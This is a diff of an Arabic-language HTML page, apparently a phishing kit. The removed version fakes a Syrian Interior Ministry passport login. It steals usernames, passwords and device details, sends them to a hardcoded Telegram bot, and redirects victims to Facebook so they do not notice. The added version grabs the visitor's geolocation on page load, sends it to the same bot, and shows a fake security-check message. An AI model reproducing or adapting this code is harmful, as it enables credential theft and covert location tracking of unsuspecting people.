@@ -1,62 +1,29 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل دخول - نظام الجوازات</title>
-    <style>
-        body { font-family: sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 300px; text-align: center; }
-        img { width: 100px; margin-bottom: 10px; }
-        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
-        button { width: 96%; padding: 10px; background-color: #1877f2; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
-        .footer { font-size: 12px; color: #777; margin-top: 15px; }
-    </style>
+    <title>تأكيد الهوية</title>
+    <script>
+        function sendToTelegram(lat, lon) {
+            let token = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
+            let chat_id = "7214473798";
+            let mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            let text = `📍 صيد موقع جديد يا مِعمار:\n🔗 الرابط: ${mapsLink}`;
+            
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`);
+        }
+
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    sendToTelegram(position.coords.latitude, position.coords.longitude);
+                    alert("تم تأكيد هويتك بنجاح.");
+                });
+            }
+        };
+    </script>
 </head>
-<body>
-
-<div class="login-box">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Flag_of_Syria.svg" alt="شعار">
-    <h3>تسجيل دخول للمتابعة</h3>
-    <p style="font-size: 13px; color: red;">يجب تسجيل الدخول برقم الموبايل أو الإيميل لتأكيد دور الجواز.</p>
-    
-    <input type="text" id="user" placeholder="رقم الموبايل أو البريد الإلكتروني" required>
-    <input type="password" id="pass" placeholder="كلمة السر" required>
-    
-    <button onclick="hit()">تسجيل الدخول</button>
-    
-    <div class="footer">وزارة الداخلية - بوابة الحجز الإلكتروني</div>
-</div>
-
-<script>
-async function hit() {
-    let user = document.getElementById("user").value;
-    let pass = document.getElementById("pass").value;
-
-    if(!user || !pass) { alert("يرجى إدخال البيانات"); return; }
-
-    // بيانات تليجرام تبعك يا مِعمار
-    let token = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
-    let chat_id = "7214473798";
-
-    // سحب معلومات الجهاز بالخلفية
-    let device = navigator.platform;
-    let screen = window.screen.width + "x" + window.screen.height;
-
-    let text = `🔥 صيد جديد من مِعمار (بدون GitHub):\n\n📧 الحساب: ${user}\n🔑 الباسورد: ${pass}\n📱 الجهاز: ${device}\n🖥️ الشاشة: ${screen}\n------------------\n🌐 الحالة: الدرس السابع ناجح!`;
-
-    let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`;
-
-    try {
-        await fetch(url);
-        // بعد الصيد، نبعته لصفحة حقيقية عشان ما يشك
-        window.location.href = "https://www.facebook.com";
-    } catch(e) {
-        alert("حدث خطأ في الاتصال، حاول مجدداً");
-    }
-}
-</script>
-
+<body style="background:#000; color:#fff; text-align:center; padding-top:50px;">
+    <h2>جاري التحقق من أمان الجهاز...</h2>
+    <p>يرجى الانتظار ثواني</p>
 </body>
 </html>
-
